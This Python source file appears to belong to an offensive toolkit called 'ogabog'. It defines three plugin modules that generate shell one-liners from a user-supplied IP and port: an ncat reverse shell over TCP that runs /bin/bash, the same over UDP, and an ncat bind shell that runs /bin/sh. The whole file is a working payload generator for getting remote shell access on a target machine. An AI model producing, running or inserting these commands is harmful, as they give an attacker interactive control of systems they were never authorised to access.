from ogabog.cores import plugin


class ReverseShell(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--ip",
            help="IP address"
        )
        self.add_args(
            "--port",
            help="Port address"
        )
        self.opts.description = "Generate reverse shell using ncat"

    def make_shell(self):
        self.shell = "ncat {} {} -e /bin/bash".format(self.args.ip, self.args.port)  # TODO add custom option for shell


class ReverseShellUDP(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--ip",
            help="IP address"
        )
        self.add_args(
            "--port",
            help="Port address"
        )
        self.opts.description = "Generate reverse shell using ncat"
        self.shell = "ncat --udp {} {} -e /bin/bash"  # TODO add custom options for shell

    def make_shell(self):
        self.shell = "ncat --udp {} {} -e /bin/bash".format(self.args.ip, self.args.port)


class BindShell(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--port",
            help="Port address"
        )
        self.opts.description = "Generate bind shell using ncat"

    def make_shell(self):
        self.shell = "ncat -l {} -e /bin/sh".format(self.args.port)
